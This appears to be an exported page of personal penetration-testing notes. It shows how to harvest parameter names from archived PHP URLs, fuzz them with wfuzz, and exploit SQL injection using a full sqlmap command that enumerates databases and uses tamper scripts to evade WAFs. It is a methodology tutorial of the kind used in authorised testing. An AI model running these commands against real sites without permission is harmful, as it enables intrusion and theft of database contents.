<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>extract parameters from php files</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>extract parameters from php files</h1><br/><br />Useful when we have a lot of PHP files that start with <strong>get</strong><br /><br /><br />1. Find .php files, example with waybackurls or other methods<br /><div class="codebox"><pre>waybackurls  example.it <span style="color:#ff9d00;font-weight:700">|</span> uro <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> <span style="color:#3ad900;font-weight:400">&quot;.php&quot;</span> &gt; php-files.txt</pre></div><br />    <br /><br />2. The full command to:<br />   1) grep only urls with &quot;get&quot; inside somewhere ( grep -i get )<br />   2) grep what comes after get ( sed &#39;s/.*.get//&#39; )<br />   3) remove the .php from file and all that comes after ( cut -f1 -d&quot;.&quot; )<br />   4) parameters with Uppercase: split php files names with a regex that split the lines if Uppercase letter is found. <a href="https://stackoverflow.com/questions/37831227/split-lines-if-uppercase-letter-found-in-a-line">source</a> (sed &#39;s/[A-Z]\+/\n&amp;/g&#39;) <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">cat</span> php-files.txt <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> -i get <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">sed</span> <span style="color:#3ad900;font-weight:400">&#39;s/.*.get//&#39;</span> <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">cut</span> -f1 -d<span style="color:#3ad900;font-weight:400">&quot;.&quot;</span> <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">sed</span> <span style="color:#3ad900;font-weight:400">&#39;s/[A-Z]\+/\n&amp;/g&#39;</span> <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">sort</span> -u  &gt; paramUP.txt</pre></div><br />   5) parameters only lowercase: because probably most of the parameters found could be lowercase and not lowercase<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">cat</span> php-files.txt <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> -i get <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">sed</span> <span style="color:#3ad900;font-weight:400">&#39;s/.*.get//&#39;</span> <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">cut</span> -f1 -d<span style="color:#3ad900;font-weight:400">&quot;.&quot;</span> <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">sed</span> <span style="color:#3ad900;font-weight:400">&#39;s/[A-Z]\+/\n&amp;/g&#39;</span> <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">sort</span> -u <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">tr</span> <span style="color:#3ad900;font-weight:400">&#39;[:upper:]&#39;</span> <span style="color:#3ad900;font-weight:400">&#39;[:lower:]&#39;</span> &gt; paramLow.txt</pre></div><br /><br />3. Test the <span style="text-decoration:underline;">uppercase</span> and <span style="text-decoration:underline;">lowercase</span> parameters both with <span style="text-decoration:underline;">GET</span> and POST requests.<br />    To do that use tools like <a href="Home--Penetration_Test_Methodology--WebApp_Pentest--Reconnaissance_(Information_Gathering)--Enumerate_parameters_(fuzzing)--wfuzz.html">wfuzz</a><br />   1) GET<br />       <div class="codebox"><pre>wfuzz -c -w params.txt <span style="color:#3ad900;font-weight:400">&quot;example.com/[file]?FUZZ=2&quot;</span></pre></div><br />   2) POST<br />       <div class="codebox"><pre>wfuzz -c -w params.txt -d <span style="color:#3ad900;font-weight:400">&quot;FUZZ=2&quot;</span>  <span style="color:#3ad900;font-weight:400">&quot;example.com/[file]?FUZZ=FUZZ&quot;</span></pre></div><br /><br /><br /><br /><span style="color:#a52a2a;">Example of SQLi exploitation with these parameters:</span><br /><h2> </h2><div class="codebox"><pre>sqlmap -r req3.txt -p commitment -force-ssl --level 5 --risk 3 --dbms=<span style="color:#3ad900;font-weight:400">&quot;MYSQL&quot;</span> --hostname --current-user --current-db --dbs --tamper=between --no-cast</pre></div><br />    --level 5 --&gt; Level of tests to perform.<br />    --risk 3 --&gt; Risk of tests to perform<br />    --dbms --&gt; back-end DBMS value<br />    --no-cast --&gt; to avoid use cast-alike statements during data fetching<br />    --tamper --&gt; to evade filters and WAF’s<br />    &quot;--hostname --current-user --current-db --dbs&quot; --&gt; to retrieve info about the database<br /><br /><br /><br /><br /><br /><br /><br />Bibliography:<br /><a href="https://0xmahmoudjo0.medium.com/how-i-found-multiple-sql-injection-with-ffuf-and-sqlmap-in-a-few-minutes-9c3bb3780e8f">https://0xmahmoudjo0.medium.com/how-i-found-multiple-sql-injection-with-ffuf-and-sqlmap-in-a-few-minutes-9c3bb3780e8f</a></div>
</body>
</html>
